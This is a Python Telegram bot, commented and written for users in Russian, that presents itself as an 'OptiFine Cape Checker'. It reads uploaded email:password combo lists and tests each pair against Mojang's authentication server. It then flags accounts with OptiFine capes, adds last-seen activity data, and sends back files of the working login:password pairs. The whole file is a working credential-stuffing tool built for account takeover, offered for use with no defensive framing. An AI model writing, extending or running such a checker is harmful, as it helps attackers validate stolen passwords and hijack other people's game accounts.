import os
import logging
import asyncio
import aiofiles
import requests
import json
import time
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from telegram.constants import ParseMode

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Конфигурация из переменных окружения
TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_IDS = os.environ.get('ADMIN_IDS', '').split(',')
ADMIN_IDS = [int(id.strip()) for id in ADMIN_IDS if id.strip()]
ALLOWED_USERS = ADMIN_IDS.copy() if ADMIN_IDS else []

# Статистика
stats = {
    'total_checked': 0,
    'valid_accounts': 0,
    'invalid_accounts': 0,
    'cape_found': 0,
    'start_time': datetime.now()
}

class AccountChecker:
    """Класс для проверки аккаунтов"""
    
    @staticmethod
    async def check_account(login, password):
        """Проверка одного аккаунта"""
        session = requests.Session()
        
        try:
            # 1. Авторизация в Mojang
            auth_payload = {
                "agent": {
                    "name": "Minecraft",
                    "version": 1
                },
                "username": login.strip(),
                "password": password.strip(),
                "requestUser": True
            }
            
            logger.info(f"Checking account: {login[:10]}...")
            
            auth_req = session.post(
                'https://authserver.mojang.com/authenticate',
                json=auth_payload,
                timeout=30
            )
            
            if auth_req.status_code != 200:
                error_msg = f"HTTP {auth_req.status_code}"
                try:
                    error_data = auth_req.json()
                    if 'errorMessage' in error_data:
                        error_msg = error_data['errorMessage']
                except:
                    pass
                
                return {
                    'login': login,
                    'status': 'invalid',
                    'error': error_msg
                }
            
            auth_data = auth_req.json()
            
            # Проверка на ошибки в ответе
            if 'error' in auth_data:
                return {
                    'login': login,
                    'status': 'invalid',
                    'error': auth_data.get('errorMessage', 'Unknown error')
                }
            
            # Проверка на миграцию в Microsoft
            if 'selectedProfile' not in auth_data:
                return {
                    'login': login,
                    'status': 'migrated',
                    'error': 'Account migrated to Microsoft'
                }
            
            # Получаем данные профиля
            uuid = auth_data['selectedProfile']['id']
            access_token = auth_data['accessToken']
            username = auth_data['selectedProfile']['name']
            
            # 2. Проверка плаща OptiFine
            headers = {'Authorization': f'Bearer {access_token}'}
            
            cape_req = session.get(
                f'https://optifine.net/api/capeInfo?user={uuid}',
                headers=headers,
                timeout=15
            )
            
            has_cape = False
            cape_name = None
            cape_url = None
            
            if cape_req.status_code == 200:
                try:
                    cape_data = cape_req.json()
                    if 'items' in cape_data:
                        for item in cape_data['items']:
                            if 'url' in item and 'cape' in item['url'].lower():
                                has_cape = True
                                cape_name = item.get('name', 'Unknown Cape')
                                cape_url = item.get('url')
                                break
                except:
                    pass
            
            # 3. Получаем информацию о последнем входе
            last_login_info = await AccountChecker.get_last_login_info(username)
            
            return {
                'login': login,
                'password': password,
                'username': username,
                'uuid': uuid,
                'status': 'valid',
                'has_cape': has_cape,
                'cape_name': cape_name,
                'cape_url': cape_url,
                'last_login': last_login_info['last_seen'],
                'activity_level': last_login_info['activity'],
                'servers': last_login_info['servers']
            }
            
        except requests.exceptions.Timeout:
            return {
                'login': login,
                'status': 'error',
                'error': 'Connection timeout (30s)'
            }
        except requests.exceptions.ConnectionError:
            return {
                'login': login,
                'status': 'error',
                'error': 'Connection failed'
            }
        except Exception as e:
            logger.error(f"Error checking {login[:10]}: {str(e)}")
            return {
                'login': login,
                'status': 'error',
                'error': str(e)[:100]
            }
        finally:
            session.close()
    
    @staticmethod
    async def get_last_login_info(username):
        """Получение информации о последнем входе"""
        try:
            # Сначала получаем UUID
            uuid_url = f"https://api.mojang.com/users/profiles/minecraft/{username}"
            uuid_response = requests.get(uuid_url, timeout=10)
            
            if uuid_response.status_code != 200:
                return {
                    'last_seen': 'Unknown',
                    'activity': 'Unknown',
                    'servers': []
                }
            
            uuid_data = uuid_response.json()
            uuid = uuid_data['id']
            
            # Пробуем получить через NameMC API
            namemc_url = f"https://api.namemc.com/profile/{uuid}"
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            
            response = requests.get(namemc_url, headers=headers, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                
                if 'lastSeen' in data:
                    last_seen_timestamp = data['lastSeen'] / 1000
                    last_seen = datetime.fromtimestamp(last_seen_timestamp)
                    days_ago = (datetime.now() - last_seen).days
                    
                    # Определяем активность
                    if days_ago == 0:
                        activity = "🔥 Active today"
                    elif days_ago < 7:
                        activity = "✅ This week"
                    elif days_ago < 30:
                        activity = "📅 This month"
                    elif days_ago < 90:
                        activity = "💤 1-3 months ago"
                    else:
                        activity = "😴 Abandoned"
                    
                    # Получаем серверы
                    servers = []
                    if 'servers' in data:
                        for server in data['servers'][:3]:
                            if 'name' in server:
                                servers.append(server['name'])
                    
                    return {
                        'last_seen': f"{days_ago} days ago" if days_ago > 0 else "Today",
                        'activity': activity,
                        'servers': servers
                    }
            
            return {
                'last_seen': 'Unknown',
                'activity': 'Unknown',
                'servers': []
            }
            
        except Exception as e:
            logger.error(f"Error getting last login: {e}")
            return {
                'last_seen': 'Unknown',
                'activity': 'Unknown',
                'servers': []
            }

async def process_accounts_file(file_path, update, context):
    """Обработка файла с аккаунтами"""
    results = {
        'valid': [],
        'with_cape': [],
        'invalid': [],
        'migrated': [],
        'error': []
    }
    
    # Отправляем начальное сообщение
    progress_msg = await update.message.reply_text(
        "🔄 **Начинаю проверку аккаунтов...**\n\n"
        "⏳ Пожалуйста, подождите. Это может занять несколько минут.",
        parse_mode=ParseMode.MARKDOWN
    )
    
    try:
        # Читаем файл
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        
        # Разбираем строки
        lines = content.strip().split('\n')
        total_lines = len(lines)
        
        # Фильтруем только валидные строки с логин:пароль
        accounts = []
        for line in lines:
            line = line.strip()
            if line and ':' in line:
                parts = line.split(':', 1)
                if len(parts) == 2 and parts[0] and parts[1]:
                    accounts.append((parts[0].strip(), parts[1].strip()))
        
        total = len(accounts)
        
        if total == 0:
            await progress_msg.edit_text(
                "❌ **Ошибка:** В файле нет валидных строк в формате `login:password`",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        # Обновляем сообщение
        await progress_msg.edit_text(
            f"📊 **Найдено аккаунтов:** {total}\n"
            f"🔄 **Начинаю проверку...**\n\n"
            f"⏱ Это займет примерно {total * 2} секунд",
            parse_mode=ParseMode.MARKDOWN
        )
        
        # Проверяем аккаунты
        start_time = time.time()
        
        for i, (login, password) in enumerate(accounts, 1):
            # Обновляем прогресс каждые 5 аккаунтов
            if i % 5 == 0 or i == total:
                elapsed = time.time() - start_time
                remaining = (elapsed / i) * (total - i) if i > 0 else 0
                
                await progress_msg.edit_text(
                    f"📊 **Прогресс:** {i}/{total}\n"
                    f"✅ **Найдено плащей:** {len(results['with_cape'])}\n"
                    f"⏱ **Прошло:** {int(elapsed)}с\n"
                    f"⏳ **Осталось:** ~{int(remaining)}с\n\n"
                    f"🔄 Проверяю: {login[:15]}...",
                    parse_mode=ParseMode.MARKDOWN
                )
            
            # Проверяем аккаунт
            result = await AccountChecker.check_account(login, password)
            
            # Классифицируем результат
            if result['status'] == 'valid':
                results['valid'].append(result)
                if result.get('has_cape'):
                    results['with_cape'].append(result)
                    stats['cape_found'] += 1
                stats['valid_accounts'] += 1
            elif result['status'] == 'migrated':
                results['migrated'].append(result)
                stats['invalid_accounts'] += 1
            elif result['status'] == 'invalid':
                results['invalid'].append(result)
                stats['invalid_accounts'] += 1
            else:
                results['error'].append(result)
                stats['invalid_accounts'] += 1
            
            stats['total_checked'] += 1
            
            # Небольшая задержка чтобы не нагружать API
            await asyncio.sleep(0.5)
        
        # Генерируем timestamp для файлов
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # 1. СОЗДАЕМ ФАЙЛ С ВАЛИДНЫМИ АККАУНТАМИ (login:password)
        if results['valid']:
            valid_file = f"valid_accounts_{timestamp}.txt"
            async with aiofiles.open(valid_file, 'w', encoding='utf-8') as f:
                for acc in results['valid']:
                    await f.write(f"{acc['login']}:{acc['password']}\n")
            
            # Отправляем файл
            with open(valid_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=valid_file,
                    caption=f"✅ **Валидные аккаунты:** {len(results['valid'])}",
                    parse_mode=ParseMode.MARKDOWN
                )
            os.remove(valid_file)
        
        # 2. СОЗДАЕМ ФАЙЛ С АККАУНТАМИ, У КОТОРЫХ ЕСТЬ ПЛАЩ
        if results['with_cape']:
            cape_file = f"cape_accounts_{timestamp}.txt"
            async with aiofiles.open(cape_file, 'w', encoding='utf-8') as f:
                await f.write("LOGIN:PASSWORD | USERNAME | CAPE | LAST LOGIN | SERVERS\n")
                await f.write("="*80 + "\n")
                for acc in results['with_cape']:
                    servers_str = ', '.join(acc.get('servers', [])[:2]) or 'None'
                    await f.write(
                        f"{acc['login']}:{acc['password']} | "
                        f"{acc['username']} | "
                        f"{acc['cape_name']} | "
                        f"{acc['last_login']} | "
                        f"{acc['activity_level']} | "
                        f"{servers_str}\n"
                    )
            
            # Отправляем файл
            with open(cape_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=cape_file,
                    caption=f"🔥 **Аккаунты с плащами:** {len(results['with_cape'])}",
                    parse_mode=ParseMode.MARKDOWN
                )
            os.remove(cape_file)
        
        # 3. ФАЙЛ С НЕРАБОЧИМИ АККАУНТАМИ (опционально)
        if results['invalid'] or results['migrated'] or results['error']:
            invalid_file = f"invalid_accounts_{timestamp}.txt"
            async with aiofiles.open(invalid_file, 'w', encoding='utf-8') as f:
                await f.write("=== НЕРАБОЧИЕ АККАУНТЫ ===\n\n")
                
                if results['invalid']:
                    await f.write("\n--- Неверный пароль/логин ---\n")
                    for acc in results['invalid'][:50]:  # Лимит чтобы файл не был огромным
                        await f.write(f"{acc['login']}:{acc['password']} - {acc.get('error', 'Invalid')}\n")
                
                if results['migrated']:
                    await f.write("\n--- Мигрированы в Microsoft ---\n")
                    for acc in results['migrated'][:50]:
                        await f.write(f"{acc['login']}:{acc['password']} - Migrated to Microsoft\n")
                
                if results['error']:
                    await f.write("\n--- Ошибки проверки ---\n")
                    for acc in results['error'][:50]:
                        await f.write(f"{acc['login']}:{acc['password']} - {acc.get('error', 'Error')}\n")
            
            with open(invalid_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=invalid_file,
                    caption=f"⚠️ **Невалидные аккаунты:** {len(results['invalid']) + len(results['migrated']) + len(results['error'])}",
                    parse_mode=ParseMode.MARKDOWN
                )
            os.remove(invalid_file)
        
        # Отправляем статистику
        elapsed_time = time.time() - start_time
        stats_text = (
            f"✅ **Проверка завершена!**\n\n"
            f"📊 **Статистика:**\n"
            f"• Всего аккаунтов: {total}\n"
            f"• ✅ Валидных: {len(results['valid'])}\n"
            f"• 🔥 С плащами: {len(results['with_cape'])}\n"
            f"• ⚠️ Неверных: {len(results['invalid'])}\n"
            f"• 🔄 Мигрировано: {len(results['migrated'])}\n"
            f"• ❌ Ошибок: {len(results['error'])}\n\n"
            f"⏱ **Время проверки:** {int(elapsed_time // 60)}м {int(elapsed_time % 60)}с\n"
            f"📁 **Файлы отправлены:** ✅"
        )
        await update.message.reply_text(stats_text, parse_mode=ParseMode.MARKDOWN)
        
        # Показываем топ плащей если есть
        if results['with_cape']:
            cape_list = "🔥 **Найденные плащи:**\n\n"
            for acc in results['with_cape'][:15]:  # Показываем первые 15
                servers = ', '.join(acc.get('servers', [])[:2]) or 'неизвестно'
                cape_list += f"• **{acc['username']}**: {acc['cape_name']}\n"
                cape_list += f"  📅 {acc['last_login']} | {acc['activity_level']}\n"
                cape_list += f"  🌍 {servers}\n\n"
            
            if len(results['with_cape']) > 15:
                cape_list += f"... и еще {len(results['with_cape']) - 15} аккаунтов с плащами"
            
            # Разбиваем на части если сообщение слишком длинное
            if len(cape_list) > 4000:
                parts = [cape_list[i:i+4000] for i in range(0, len(cape_list), 4000)]
                for part in parts:
                    await update.message.reply_text(part, parse_mode=ParseMode.MARKDOWN)
            else:
                await update.message.reply_text(cape_list, parse_mode=ParseMode.MARKDOWN)
        
    except Exception as e:
        logger.error(f"Error processing file: {e}")
        await update.message.reply_text(f"❌ **Ошибка при обработке:** {str(e)}", parse_mode=ParseMode.MARKDOWN)
    finally:
        # Удаляем временный файл
        if os.path.exists(file_path):
            os.remove(file_path)

# Обработчики команд
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда /start"""
    user_id = update.effective_user.id
    
    # Проверка доступа
    if ALLOWED_USERS and user_id not in ALLOWED_USERS:
        await update.message.reply_text("❌ У вас нет доступа к этому боту.")
        return
    
    # Создаем клавиатуру
    keyboard = [
        [InlineKeyboardButton("📊 Статистика", callback_data='stats')],
        [InlineKeyboardButton("❓ Помощь", callback_data='help')],
        [InlineKeyboardButton("📝 Формат файла", callback_data='format')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Приветственное сообщение
    welcome_text = (
        f"👋 **OptiFine Cape Checker Bot**\n\n"
        f"Привет, {update.effective_user.first_name}!\n\n"
        f"🔍 **Что я умею:**\n"
        f"• Проверять логин:пароль аккаунтов Minecraft\n"
        f"• Определять наличие OptiFine плаща\n"
        f"• Показывать последний вход и активность\n"
        f"• Сортировать аккаунты по категориям\n\n"
        f"📥 **Как использовать:**\n"
        f"Просто отправь мне .txt файл с аккаунтами в формате:\n"
        f"`email:password`\n\n"
        f"📊 **Статистика бота:**\n"
        f"• Проверено аккаунтов: {stats['total_checked']}\n"
        f"• Найдено плащей: {stats['cape_found']}\n\n"
        f"👇 **Выберите действие:**"
    )
    
    await update.message.reply_text(
        welcome_text,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка нажатий на кнопки"""
    query = update.callback_query
    await query.answer()
    
    if query.data == 'stats':
        uptime = datetime.now() - stats['start_time']
        hours = int(uptime.seconds // 3600)
        minutes = int((uptime.seconds // 60) % 60)
        
        text = (
            f"📊 **Статистика бота:**\n\n"
            f"📈 **Всего проверено:** {stats['total_checked']}\n"
            f"✅ **Валидных:** {stats['valid_accounts']}\n"
            f"❌ **Невалидных:** {stats['invalid_accounts']}\n"
            f"🔥 **С плащами:** {stats['cape_found']}\n\n"
            f"⏱ **Работает:** {hours}ч {minutes}мин\n"
            f"📅 **Запущен:** {stats['start_time'].strftime('%d.%m.%Y %H:%M')}"
        )
        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)
    
    elif query.data == 'help':
        text = (
            "📚 **Как пользоваться ботом:**\n\n"
            "1️⃣ **Подготовьте файл**\n"
            "   • Создайте текстовый файл (.txt)\n"
            "   • Каждая строка: логин:пароль\n"
            "   • Пример: `email@gmail.com:password123`\n\n"
            "2️⃣ **Отправьте файл**\n"
            "   • Нажмите на скрепку 📎\n"
            "   • Выберите ваш .txt файл\n"
            "   • Отправьте боту\n\n"
            "3️⃣ **Дождитесь результатов**\n"
            "   • Бот покажет прогресс\n"
            "   • После проверки придут файлы:\n"
            "     - Валидные аккаунты\n"
            "     - Аккаунты с плащами\n"
            "     - Невалидные аккаунты\n\n"
            "⚠️ **Важно:**\n"
            "• Только старые аккаунты Mojang\n"
            "• Microsoft не поддерживаются\n"
            "• Файл не больше 5 МБ\n"
            "• До 1000 аккаунтов за раз\n\n"
            "📌 **Команды:**\n"
            "/start - Главное меню\n"
            "/stats - Статистика\n"
            "/help - Эта справка"
        )
        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)
    
    elif query.data == 'format':
        text = (
            "📝 **Формат файла:**\n\n"
            "✅ **Правильный формат:**\n"
            "```\n"
            "player1@gmail.com:qwerty123\n"
            "player2@yandex.ru:minecraft2024\n"
            "player3@mail.ru:password123\n"
            "```\n\n"
            "❌ **Неправильный формат:**\n"
            "```\n"
            "player1@gmail.com qwerty123  (нет двоеточия)\n"
            "player2:pass                 (неполный email)\n"
            ":password123                 (нет логина)\n"
            "login:                       (нет пароля)\n"
            "```\n\n"
            "📦 **Что вы получите:**\n"
            "• **valid_accounts_*.txt** - все рабочие аккаунты\n"
            "• **cape_accounts_*.txt** - аккаунты с плащами\n"
            "• **invalid_accounts_*.txt** - нерабочие аккаунты\n\n"
            "ℹ️ **Кодировка:** UTF-8 (обычные текстовые файлы)"
        )
        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда /stats"""
    uptime = datetime.now() - stats['start_time']
    hours = int(uptime.seconds // 3600)
    minutes = int((uptime.seconds // 60) % 60)
    
    text = (
        f"📊 **Статистика бота:**\n\n"
        f"📈 **Всего проверено:** {stats['total_checked']}\n"
        f"✅ **Валидных:** {stats['valid_accounts']}\n"
        f"❌ **Невалидных:** {stats['invalid_accounts']}\n"
        f"🔥 **С плащами:** {stats['cape_found']}\n\n"
        f"⏱ **Работает:** {hours}ч {minutes}мин\n"
        f"📅 **Запущен:** {stats['start_time'].strftime('%d.%m.%Y %H:%M')}"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда /help"""
    text = (
        "📚 **OptiFine Cape Checker Bot - Помощь**\n\n"
        "🔍 **Что умеет бот:**\n"
        "• Проверять логин:пароль аккаунтов Minecraft\n"
        "• Определять наличие OptiFine плаща\n"
        "• Показывать последний вход на серверы\n"
        "• Автоматически сортировать результаты\n\n"
        "📥 **Как использовать:**\n"
        "1. Подготовьте .txt файл с аккаунтами\n"
        "2. Каждая строка: логин:пароль\n"
        "3. Отправьте файл боту\n"
        "4. Получите 3 файла с результатами\n\n"
        "⚡ **Советы:**\n"
        "• Не отправляйте больше 1000 аккаунтов за раз\n"
        "• Убедитесь, что файл в кодировке UTF-8\n"
        "• Для Microsoft аккаунтов используйте другие инструменты\n\n"
        "🆘 **Поддержка:**\n"
        "Если бот не работает, проверьте:\n"
        "• Правильность формата файла\n"
        "• Наличие интернета\n"
        "• Актуальность токена\n\n"
        "👨‍💻 **Команды:**\n"
        "/start - Главное меню\n"
        "/stats - Статистика\n"
        "/help - Эта справка"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка полученного файла"""
    user_id = update.effective_user.id
    
    # Проверка доступа
    if ALLOWED_USERS and user_id not in ALLOWED_USERS:
        await update.message.reply_text("❌ У вас нет доступа к этому боту.")
        return
    
    # Получаем документ
    document = update.message.document
    
    # Проверяем расширение
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text(
            "❌ **Ошибка:** Пожалуйста, отправьте файл с расширением .txt\n"
            "📝 Поддерживаются только текстовые файлы.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Проверяем размер файла (макс 5 МБ)
    if document.file_size > 5 * 1024 * 1024:
        await update.message.reply_text(
            "❌ **Ошибка:** Файл слишком большой!\n"
            f"📦 Размер: {document.file_size / 1024 / 1024:.1f} МБ\n"
            "⚠️ Максимальный размер: 5 МБ",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Скачиваем файл
    try:
        await update.message.reply_text(
            f"📥 **Файл получен:** {document.file_name}\n"
            f"📦 **Размер:** {document.file_size / 1024:.1f} КБ\n\n"
            f"🔄 Начинаю обработку...",
            parse_mode=ParseMode.MARKDOWN
        )
        
        file = await context.bot.get_file(document.file_id)
        file_path = f"temp_{user_id}_{document.file_name}"
        await file.download_to_drive(file_path)
        
        # Запускаем проверку
        await process_accounts_file(file_path, update, context)
        
    except Exception as e:
        logger.error(f"Error downloading file: {e}")
        await update.message.reply_text(
            f"❌ **Ошибка при скачивании файла:** {str(e)}",
            parse_mode=ParseMode.MARKDOWN
        )

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка ошибок"""
    logger.error(f"Update {update} caused error {context.error}")
    
    try:
        if update and update.message:
            await update.message.reply_text(
                "❌ **Произошла внутренняя ошибка.**\n"
                "Пожалуйста, попробуйте позже или обратитесь к администратору.",
                parse_mode=ParseMode.MARKDOWN
            )
    except:
        pass

def main():
    """Запуск бота"""
    # Проверяем наличие токена
    if not TOKEN:
        logger.error("❌ BOT_TOKEN not set in environment variables!")
        print("❌ ERROR: BOT_TOKEN not set!")
        return
    
    # Проверяем админов
    if not ADMIN_IDS:
        logger.warning("⚠️ ADMIN_IDS not set - anyone can use the bot!")
        print("⚠️ WARNING: No admin IDs set - anyone can use the bot!")
    
    print("=" * 50)
    print("🚀 Starting OptiFine Cape Checker Bot...")
    print(f"📊 Initial stats: {stats}")
    print(f"👥 Admin IDs: {ADMIN_IDS if ADMIN_IDS else 'No admins set'}")
    print("=" * 50)
    
    try:
        # Создаем приложение
        application = Application.builder().token(TOKEN).build()
        
        # Добавляем обработчики
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("help", help_command))
        application.add_handler(CommandHandler("stats", stats_command))
        application.add_handler(CallbackQueryHandler(button_callback))
        application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
        
        # Обработчик ошибок
        application.add_error_handler(error_handler)
        
        # Запускаем бота
        print("✅ Bot is running! Press Ctrl+C to stop.")
        application.run_polling(allowed_updates=Update.ALL_TYPES)
        
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        print(f"❌ Fatal error: {e}")

if __name__ == '__main__':
    main()